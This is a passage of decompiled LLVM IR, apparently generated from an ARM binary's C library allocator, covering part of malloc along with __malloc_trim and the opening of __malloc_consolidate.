  store i32 %v1_169d4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16a30

dec_label_pc_169e0:                               ; preds = %bb194
  %v1_169e0 = load i32, i32* @r4, align 4
  %v3_169e0 = icmp ult i32 %v1_169c4, %v1_169e0
  br i1 %v3_169e0, label %dec_label_pc_169e8, label %dec_label_pc_16a30

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169e0
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r2.global-to-local, align 4
  %v3_169ec = load i32, i32* @global_var_34a7c.1442, align 4
  %v0_169f0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_169f0, i32* %r0.global-to-local, align 4
  %v1_169f4 = and i32 %v3_169ec, -2
  store i32 %v1_169f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_169f4, i32* @global_var_34a7c.1442, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a04:                               ; preds = %.thread42
  %v3_16a04 = icmp eq i32 %v0_16a04, -1
  br i1 %v3_16a04, label %dec_label_pc_16a0c, label %dec_label_pc_16a28

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_16a04
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16a10 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16a10, i32* %r0.global-to-local, align 4
  %v3_16a14 = load i32, i32* @global_var_34a84.1440, align 4
  store i32 %v3_16a14, i32* %r2.global-to-local, align 4
  %v0_16a18 = load i32, i32* @r4, align 4
  %v0_16a1c = load i32, i32* @r5, align 4
  %v2_16a18 = add i32 %v3_16a14, %v1_16a10
  %v2_16a1c = sub i32 %v2_16a18, %v0_16a18
  %v2_16a20 = sub i32 %v2_16a1c, %v0_16a1c
  store i32 %v2_16a20, i32* %r3.global-to-local, align 4
  store i32 %v2_16a20, i32* @global_var_34a84.1440, align 4
  %v0_16a2c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16a28

dec_label_pc_16a28:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_16a0c
  %v0_16a30137 = phi i32 [ %v1_16a10, %dec_label_pc_16a0c ], [ %v0_16a04, %dec_label_pc_16a04 ]
  %v0_16a2c = phi i32 [ %v0_16a2c.pre, %dec_label_pc_16a0c ], [ 0, %dec_label_pc_16a04 ]
  %v0_16a28 = phi i32 [ %v0_16a18, %dec_label_pc_16a0c ], [ %v0_16a28.pre, %dec_label_pc_16a04 ]
  store i32 %v0_16a28, i32* @r7, align 4
  store i32 %v0_16a2c, i32* @r5, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %dec_label_pc_169e0, %dec_label_pc_169e8, %dec_label_pc_169d0, %dec_label_pc_16a28
  %v0_16a38 = phi i32 [ %v1_169c4, %dec_label_pc_169e0 ], [ %v0_169f0, %dec_label_pc_169e8 ], [ %v1_169d4, %dec_label_pc_169d0 ], [ %v0_16a30137, %dec_label_pc_16a28 ]
  %v7_16a30 = icmp eq i32 %v0_16a38, -1
  br i1 %v7_16a30, label %dec_label_pc_16aa8, label %dec_label_pc_16a38

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a30
  %v1_16a38 = load i32, i32* @r5, align 4
  %v2_16a38 = add i32 %v1_16a38, %v0_16a38
  %v0_16a3c = load i32, i32* @r7, align 4
  %v2_16a3c = sub i32 %v2_16a38, %v0_16a3c
  %v1_16a40 = or i32 %v2_16a3c, 1
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r6, align 4
  %v2_16a48 = add i32 %v0_16a3c, 4
  %v3_16a48 = inttoptr i32 %v2_16a48 to i32*
  store i32 %v1_16a40, i32* %v3_16a48, align 4
  %v3_16a4c = load i32, i32* @global_var_34a84.1440, align 4
  %v0_16a50 = load i32, i32* %r8.global-to-local, align 4
  %v2_16a50 = icmp eq i32 %v0_16a50, 0
  %v0_16a54 = load i32, i32* @r5, align 4
  %v2_16a54 = add i32 %v0_16a54, %v3_16a4c
  store i32 %v2_16a54, i32* %r3.global-to-local, align 4
  store i32 %v2_16a54, i32* @global_var_34a84.1440, align 4
  %v0_16a5c = load i32, i32* @r7, align 4
  store i32 %v0_16a5c, i32* @global_var_34748.1431, align 4
  br i1 %v2_16a50, label %dec_label_pc_16aa8, label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a38
  store i32 %v2_16944, i32* %r0.global-to-local, align 4
  %v1_16a68 = add i32 %v0_16a50, -12
  %v1_16a6c = and i32 %v1_16a68, -8
  %v2_16a70 = add i32 %v1_16a6c, %v2_16944
  store i32 %v2_16a70, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_16a78 = icmp ugt i32 %v1_16a6c, 14
  %v1_16a7c = or i32 %v1_16a6c, 1
  store i32 %v1_16a7c, i32* %r3.global-to-local, align 4
  store i32 %v1_16a7c, i32* %v2_16868, align 4
  %v0_16a84 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a84 = load i32, i32* %r1.global-to-local, align 4
  %v2_16a84 = add i32 %v1_16a84, 8
  %v3_16a84 = inttoptr i32 %v2_16a84 to i32*
  store i32 %v0_16a84, i32* %v3_16a84, align 4
  %v0_16a88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a88 = load i32, i32* %r1.global-to-local, align 4
  %v2_16a88 = add i32 %v1_16a88, 4
  %v3_16a88 = inttoptr i32 %v2_16a88 to i32*
  store i32 %v0_16a88, i32* %v3_16a88, align 4
  br i1 %v2_16a78, label %dec_label_pc_16a90, label %dec_label_pc_16aa8

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a64
  %v3_16a90 = load i32, i32* @global_var_34a60.1444, align 4
  store i32 %v3_16a90, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_16a98 = load i32, i32* %r0.global-to-local, align 4
  %v1_16a98 = add i32 %v0_16a98, 8
  store i32 %v1_16a98, i32* @r0, align 4
  store i32 -1, i32* @global_var_34a60.1444, align 4
  %v0_16aa0 = call i32 @free()
  store i32 %v0_16aa0, i32* %r0.global-to-local, align 4
  %v0_16aa4 = load i32, i32* @r4, align 4
  store i32 %v0_16aa4, i32* @global_var_34a60.1444, align 4
  br label %dec_label_pc_16aa8

dec_label_pc_16aa8:                               ; preds = %.thread36, %dec_label_pc_16a64, %dec_label_pc_16a38, %dec_label_pc_16a30, %dec_label_pc_16a90
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %lr.global-to-local, align 4
  %v2_16ab0 = load i32, i32* @global_var_34a84.1440, align 4
  store i32 %v2_16ab0, i32* %r1.global-to-local, align 4
  %v5_16ab0 = load i32, i32* @global_var_34a88.1445, align 4
  %v3_16ab8 = load i32, i32* @global_var_34a80.1438, align 4
  %v3_16abc = load i32, i32* @global_var_34a90.1441, align 4
  store i32 %v3_16abc, i32* @r2, align 4
  %v2_16ac0 = add i32 %v3_16ab8, %v2_16ab0
  store i32 %v2_16ac0, i32* %r3.global-to-local, align 4
  %tmp251 = icmp ugt i32 %v2_16ab0, %v5_16ab0
  br i1 %tmp251, label %bb195, label %bb196

bb195:                                            ; preds = %dec_label_pc_16aa8
  store i32 %v2_16ab0, i32* @global_var_34a88.1445, align 4
  br label %bb196

bb196:                                            ; preds = %dec_label_pc_16aa8, %bb195
  %tmp252 = icmp ugt i32 %v2_16ac0, %v3_16abc
  br i1 %tmp252, label %bb197, label %bb198

bb197:                                            ; preds = %bb196
  store i32 %v2_16ac0, i32* @global_var_34a90.1441, align 4
  br label %bb198

bb198:                                            ; preds = %bb196, %bb197
  %v3_16ad0 = load i32, i32* @global_var_34748.1431, align 4
  store i32 %v3_16ad0, i32* @ip, align 4
  %v1_16ad4 = add i32 %v3_16ad0, 4
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i32*
  %v3_16ad4 = load i32, i32* %v2_16ad4, align 4
  store i32 %v1_1672c, i32* %r0.global-to-local, align 4
  %v1_16adc = and i32 %v3_16ad4, -4
  store i32 %v1_16adc, i32* %r3.global-to-local, align 4
  %v3_16ae0 = icmp ult i32 %v1_16adc, %v1_1672c
  br i1 %v3_16ae0, label %dec_label_pc_16b0c, label %dec_label_pc_16ae8

dec_label_pc_16ae8:                               ; preds = %bb198
  %v0_16ae8 = load i32, i32* @sl, align 4
  %v2_16ae8 = sub i32 %v1_16adc, %v0_16ae8
  %v2_16aec = add i32 %v0_16ae8, %v3_16ad0
  store i32 %v2_16aec, i32* %r1.global-to-local, align 4
  %v1_16af0 = or i32 %v2_16ae8, 1
  store i32 %v1_16af0, i32* %r3.global-to-local, align 4
  %v1_16af4 = or i32 %v0_16ae8, 1
  store i32 %v1_16af4, i32* @r2, align 4
  %v1_16af8 = add i32 %v3_16ad0, 8
  store i32 %v1_16af8, i32* %r0.global-to-local, align 4
  store i32 %v1_16af4, i32* %v2_16ad4, align 4
  %v0_16b00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16b00, i32* @global_var_34748.1431, align 4
  %v0_16b04 = load i32, i32* %r3.global-to-local, align 4
  %v2_16b04 = add i32 %v0_16b00, 4
  %v3_16b04 = inttoptr i32 %v2_16b04 to i32*
  store i32 %v0_16b04, i32* %v3_16b04, align 4
  %v0_16b1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16b0c:                               ; preds = %bb186, %bb198, %dec_label_pc_16914
  %v0_16b0c = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16b14 = inttoptr i32 %v0_16b0c to i32*
  store i32 12, i32* %v2_16b14, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16b1c:                               ; preds = %bb180, %bb179, %dec_label_pc_16ae8, %dec_label_pc_16774, %dec_label_pc_16b0c
  %v0_16b1c = phi i32 [ %v1_1684c, %bb180 ], [ %v1_1684c, %bb179 ], [ %v0_16b1c.pre, %dec_label_pc_16ae8 ], [ %v1_1677c, %dec_label_pc_16774 ], [ 0, %dec_label_pc_16b0c ]
  store i32 %v0_16b1c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %.thread1, %dec_label_pc_16740, %bb174, %dec_label_pc_165dc, %dec_label_pc_165d0, %dec_label_pc_1645c, %dec_label_pc_163e8, %dec_label_pc_16b1c
  store i32 %v2_1632c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 98448, i32* %r3.global-to-local, align 4
  store i32 92980, i32* @lr, align 4
  %v1_16b30 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_16b30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b34

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16358, %dec_label_pc_16b20
  %v0_16b34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b34, i32* %r0.global-to-local, align 4
  store i32 %v3_1631c, i32* @r4, align 4
  store i32 %v6_1631c, i32* @r5, align 4
  store i32 %v9_1631c, i32* @r6, align 4
  store i32 %v12_1631c, i32* @r7, align 4
  store i32 %v15_1631c, i32* @r8, align 4
  store i32 %v18_1631c, i32* @sb, align 4
  store i32 %v21_1631c, i32* @sl, align 4
  store i32 %v24_1631c, i32* @fp, align 4
  ret i32 %v0_16b34

; uselistorder directives
  uselistorder i32 %v0_16ae8, { 1, 0, 2 }
  uselistorder i32 %v3_16ad0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16ac0, { 1, 0, 2 }
  uselistorder i32 %v2_16ab0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_16a6c, { 1, 2, 0 }
  uselistorder i32 %v0_16a3c, { 1, 0 }
  uselistorder i32 %v0_16a38, { 1, 0 }
  uselistorder i32 %v2_16a20, { 1, 0 }
  uselistorder i32 %v2_169b8, { 2, 1, 0 }
  uselistorder i32 %v2_16998, { 1, 0, 2 }
  uselistorder i32 %v1_16994, { 2, 1, 0 }
  uselistorder i32 %v1_16978, { 1, 0 }
  uselistorder i32 %v2_16958, { 1, 0 }
  uselistorder i32 %v3_1694c, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_1692c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_16928, { 0, 3, 1, 2 }
  uselistorder i32 %v0_16a04, { 1, 2, 0 }
  uselistorder i32 %v0_16a28.pre, { 3, 4, 6, 5, 1, 7, 8, 2, 0 }
  uselistorder i32 %v6_168f0, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 %v0_168dc, { 2, 1, 0 }
  uselistorder i32 %v0_168c4, { 1, 0 }
  uselistorder i32 %v2_16888, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16884, { 1, 0 }
  uselistorder i32 %v3_16860, { 1, 0, 2 }
  uselistorder i32 %v2_16944, { 0, 3, 1, 2, 5, 4 }
  uselistorder i32 %v2_16844, { 1, 0, 2 }
  uselistorder i32 %v2_1682c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_167dc, { 2, 1, 0 }
  uselistorder i32 %v6_167d0, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_167ac, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1676c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1672c, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_16724, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 %v0_16714, { 1, 0 }
  uselistorder i32 %v0_166e4, { 1, 0 }
  uselistorder i32 %v7_166d8, { 1, 0 }
  uselistorder i32 %v4_166d8, { 1, 0 }
  uselistorder i32 %v0_166ac, { 1, 0 }
  uselistorder i32 %v2_16688, { 3, 2, 1, 0 }
  uselistorder i32 %lr.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1668456, { 1, 0 }
  uselistorder i32 %v1_16658, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_16640., { 1, 2, 0 }
  uselistorder i32 %v0_16648, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16648, { 1, 0 }
  uselistorder i32 %v3_16624, { 1, 0 }
  uselistorder i32 %v1_165a0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_165f8, { 1, 0 }
  uselistorder i32 %v1_165dc, { 1, 0 }
  uselistorder i32 %v1_164a0, { 1, 0 }
  uselistorder i32 %v0_165bc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_16584, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16618.pre, { 1, 2, 0 }
  uselistorder i32 %v0_16560, { 2, 1, 0 }
  uselistorder i32 %v3_1655458, { 1, 2, 0 }
  uselistorder i32 %v0_1654c, { 1, 2, 0 }
  uselistorder i32 %v1_16558, { 1, 0 }
  uselistorder i32 %v3_16554, { 0, 2, 3, 1 }
  uselistorder i32 %v1_16524, { 1, 0 }
  uselistorder i32 %v0_16524, { 1, 0 }
  uselistorder i32 %v3_16504, { 0, 2, 3, 1 }
  uselistorder i32 %v2_164f4, { 1, 0, 2 }
  uselistorder i32 %v0_164d0, { 1, 2, 3, 0 }
  uselistorder i1 %v1_164b8, { 1, 0 }
  uselistorder i1 %v2_164b0, { 1, 0 }
  uselistorder i32 %v0_164b0, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v0_16480, { 1, 0 }
  uselistorder i32 %v1_16434, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1646c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_16494, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v0_16498, { 1, 0, 2 }
  uselistorder i32 %v3_163dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_163d0, { 1, 0 }
  uselistorder i32 %v3_163a8, { 1, 0 }
  uselistorder i32 %v0_1639c, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_1637c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16370, { 1, 0 }
  uselistorder i32 %v0_16350, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 10, 7, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 83, 84, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 45, 44, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 62, 69, 57, 58, 59, 60, 61, 63, 64, 65, 0, 66, 67, 78, 68, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 85, 86, 87 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 10, 8, 9, 13, 11, 12, 15, 14, 19, 16, 18, 17, 21, 20, 25, 23, 22, 24, 27, 26, 29, 28, 30, 31, 32, 34, 35, 33, 40, 37, 46, 47, 36, 38, 39, 41, 48, 42, 43, 44, 45, 50, 49, 52, 1, 51, 0 }
  uselistorder i32* %lr.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 16, 17, 20, 21, 18, 0, 19, 22, 23 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 5, 3, 0, 4, 6 }
  uselistorder i32* @global_var_34a7c.1442, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 820, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_16b34, { 1, 0 }
  uselistorder label %dec_label_pc_16b20, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_16b1c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16b0c, { 1, 2, 0 }
  uselistorder label %bb198, { 1, 0 }
  uselistorder label %bb196, { 1, 0 }
  uselistorder label %dec_label_pc_16aa8, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16a30, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16a28, { 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %.thread42, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_16914, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb186, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %dec_label_pc_16858, { 2, 0, 3, 1 }
  uselistorder label %bb179, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_16720, { 0, 2, 1 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_16684, { 1, 0 }
  uselistorder label %dec_label_pc_1668c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16658, { 1, 0 }
  uselistorder label %dec_label_pc_16618, { 1, 0 }
  uselistorder label %dec_label_pc_165ac, { 1, 0 }
  uselistorder label %dec_label_pc_165a8, { 1, 0 }
  uselistorder label %dec_label_pc_16560, { 1, 0 }
  uselistorder label %dec_label_pc_16544, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16518, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_16504, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_16b60 = add i32 %arg2, 44
  %v2_16b60 = inttoptr i32 %v1_16b60 to i32*
  %v3_16b60 = load i32, i32* %v2_16b60, align 4
  %v1_16b68 = add i32 %v3_16b60, 4
  %v2_16b68 = inttoptr i32 %v1_16b68 to i32*
  %v3_16b68 = load i32, i32* %v2_16b68, align 4
  %v1_16b6c = add i32 %arg2, 860
  %v2_16b6c = inttoptr i32 %v1_16b6c to i32*
  %v3_16b6c = load i32, i32* %v2_16b6c, align 4
  store i32 %v3_16b6c, i32* @r4, align 4
  %v1_16b70 = and i32 %v3_16b68, -4
  store i32 %v1_16b70, i32* %r6.global-to-local, align 4
  %v1_16b74 = add i32 %v1_16b70, -17
  %v2_16b78 = add i32 %v1_16b74, %v3_16b6c
  store i32 %arg2, i32* @r5, align 4
  %v2_16b80 = sub i32 %v2_16b78, %arg1
  store i32 %v3_16b6c, i32* %r1.global-to-local, align 4
  %v2_16b88 = udiv i32 %v2_16b80, %v3_16b6c
  %v1_16b8c = add i32 %v2_16b88, -1
  %v2_16b90 = mul i32 %v1_16b8c, %v3_16b6c
  store i32 %v2_16b90, i32* %r7.global-to-local, align 4
  %v2_16b94 = icmp eq i32 %v2_16b90, 0
  store i1 %v2_16b94, i1* @cpsr_z, align 1
  %tmp6 = icmp slt i32 %v2_16b90, 1
  br i1 %tmp6, label %dec_label_pc_16bfc, label %dec_label_pc_16b9c

dec_label_pc_16b9c:                               ; preds = %entry
  %v1_16ba0 = call i32 @__GI_sbrk(i32 0)
  %v0_16ba4 = load i32, i32* @r5, align 4
  %v1_16ba4 = add i32 %v0_16ba4, 44
  %v2_16ba4 = inttoptr i32 %v1_16ba4 to i32*
  %v3_16ba4 = load i32, i32* %v2_16ba4, align 4
  %v0_16ba8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16ba8 = add i32 %v0_16ba8, %v3_16ba4
  %v9_16bac = icmp eq i32 %v1_16ba0, %v2_16ba8
  store i1 %v9_16bac, i1* @cpsr_z, align 1
  store i32 %v1_16ba0, i32* @r4, align 4
  br i1 %v9_16bac, label %dec_label_pc_16bb8, label %dec_label_pc_16bfc

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16b9c
  %v0_16bb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_16bb8 = sub i32 0, %v0_16bb8
  %v1_16bbc = call i32 @__GI_sbrk(i32 %v1_16bb8)
  %v1_16bc4 = call i32 @__GI_sbrk(i32 0)
  %v7_16bc8 = icmp eq i32 %v1_16bc4, -1
  store i1 %v7_16bc8, i1* @cpsr_z, align 1
  br i1 %v7_16bc8, label %dec_label_pc_16bfc, label %dec_label_pc_16bd0

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bb8
  %v0_16bd0 = load i32, i32* @r4, align 4
  %v2_16bd0 = sub i32 %v0_16bd0, %v1_16bc4
  %v9_16bd0 = icmp eq i32 %v0_16bd0, %v1_16bc4
  store i1 %v9_16bd0, i1* @cpsr_z, align 1
  br i1 %v9_16bd0, label %dec_label_pc_16bfc, label %dec_label_pc_16bd8

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16bd0
  %v0_16bd8 = load i32, i32* @r5, align 4
  %v1_16bd8 = add i32 %v0_16bd8, 872
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i32*
  %v3_16bd8 = load i32, i32* %v2_16bd8, align 4
  %v1_16bdc = load i32, i32* %r6.global-to-local, align 4
  %v2_16bdc = sub i32 %v1_16bdc, %v2_16bd0
  %v1_16be0 = add i32 %v0_16bd8, 44
  %v2_16be0 = inttoptr i32 %v1_16be0 to i32*
  %v3_16be0 = load i32, i32* %v2_16be0, align 4
  store i32 %v3_16be0, i32* %r1.global-to-local, align 4
  %v2_16be4 = sub i32 %v3_16bd8, %v2_16bd0
  %v1_16be8 = or i32 %v2_16bdc, 1
  store i32 %v1_16be8, i32* @r2, align 4
  store i32 %v2_16be4, i32* %v2_16bd8, align 4
  %v0_16bf4 = load i32, i32* @r2, align 4
  %v1_16bf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_16bf4 = add i32 %v1_16bf4, 4
  %v3_16bf4 = inttoptr i32 %v2_16bf4 to i32*
  store i32 %v0_16bf4, i32* %v3_16bf4, align 4
  ret i32 1

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16b9c, %dec_label_pc_16bd0, %dec_label_pc_16bb8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i1 %v7_16bc8, { 1, 0 }
  uselistorder i32 %v1_16bc4, { 2, 1, 0 }
  uselistorder i32 %v3_16b6c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16bfc, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_16c04 = load i32, i32* @r0, align 4
  %v1_16c04 = inttoptr i32 %v0_16c04 to i32*
  %v2_16c04 = load i32, i32* %v1_16c04, align 4
  store i32 %v2_16c04, i32* %r3.global-to-local, align 4
  %v2_16c08 = icmp eq i32 %v2_16c04, 0
  %v3_16c0c = load i32, i32* @r4, align 4
  store i32 %v3_16c0c, i32* %stack_var_-36, align 4
  store i32 %v0_16c04, i32* @r4, align 4
  br i1 %v2_16c08, label %dec_label_pc_16d40.preheader, label %dec_label_pc_16c1c

dec_label_pc_16d40.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_16d4826 = add i32 %v0_16c04, 52
  store i32 %v1_16d4826, i32* %r3.global-to-local, align 4
  %v2_16d5027 = add i32 %v0_16c04, 60
  %v3_16d5028 = inttoptr i32 %v2_16d5027 to i32*
  store i32 %v1_16d4826, i32* %v3_16d5028, align 4
  %v0_16d5429 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d5430 = add i32 %v0_16d5429, 12
  %v3_16d5431 = inttoptr i32 %v2_16d5430 to i32*
  store i32 %v0_16d5429, i32* %v3_16d5431, align 4
  br label %dec_label_pc_16d40.dec_label_pc_16d40_crit_edge

dec_label_pc_16c1c:                               ; preds = %entry
  %v1_16c1c = and i32 %v2_16c04, -3
  %v3_16c20 = udiv i32 %v2_16c04, 8
  store i32 %v3_16c20, i32* %r2.global-to-local, align 4
  store i32 %v1_16c1c, i32* %v1_16c04, align 4
  %v0_16c28 = load i32, i32* @r0, align 4
  %v1_16c28 = add i32 %v0_16c28, -4
  store i32 %v1_16c28, i32* %r3.global-to-local, align 4
  %v1_16c2c = load i32, i32* %r2.global-to-local, align 4
  %v4_16c2c = mul i32 %v1_16c2c, 4
  %v5_16c2c = add i32 %v4_16c2c, %v1_16c28
  store i32 %v5_16c2c, i32* %sb.global-to-local, align 4
  %v1_16c30 = add i32 %v0_16c28, 52
  store i32 %v1_16c30, i32* %r7.global-to-local, align 4
  %v1_16c34 = add i32 %v0_16c28, 4
  store i32 %v1_16c34, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c3c:                               ; preds = %bb24, %dec_label_pc_16c1c
  %v1_16d3011 = phi i32 [ %v1_16d30, %bb24 ], [ %v5_16c2c, %dec_label_pc_16c1c ]
  %v1_16c48 = phi i32 [ %v1_16d38, %bb24 ], [ %v1_16c34, %dec_label_pc_16c1c ]
  %v1_16c3c = inttoptr i32 %v1_16c48 to i32*
  %v2_16c3c = load i32, i32* %v1_16c3c, align 4
  store i32 %v2_16c3c, i32* %r1.global-to-local, align 4
  %v2_16c40 = icmp eq i32 %v2_16c3c, 0
  br i1 %v2_16c40, label %dec_label_pc_16d30, label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c3c
  %v0_16c48 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16c48, i32* %v1_16c3c, align 4
  %v0_16c4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16d24, %dec_label_pc_16c48
  %v0_16c68 = phi i32 [ %v0_16d24, %dec_label_pc_16d24 ], [ %v0_16c4c.pre, %dec_label_pc_16c48 ]
  %v1_16c4c = add i32 %v0_16c68, 4
  %v2_16c4c = inttoptr i32 %v1_16c4c to i32*
  %v3_16c4c = load i32, i32* %v2_16c4c, align 4
  store i32 %v3_16c4c, i32* %r3.global-to-local, align 4
  %v1_16c50 = and i32 %v3_16c4c, -2
  store i32 %v1_16c50, i32* %lr.global-to-local, align 4
  %v2_16c54 = add i32 %v1_16c50, %v0_16c68
  store i32 %v2_16c54, i32* @r0, align 4
  %v1_16c58 = urem i32 %v3_16c4c, 2
  %v2_16c58 = icmp eq i32 %v1_16c58, 0
  %v1_16c5c = add i32 %v0_16c68, 8
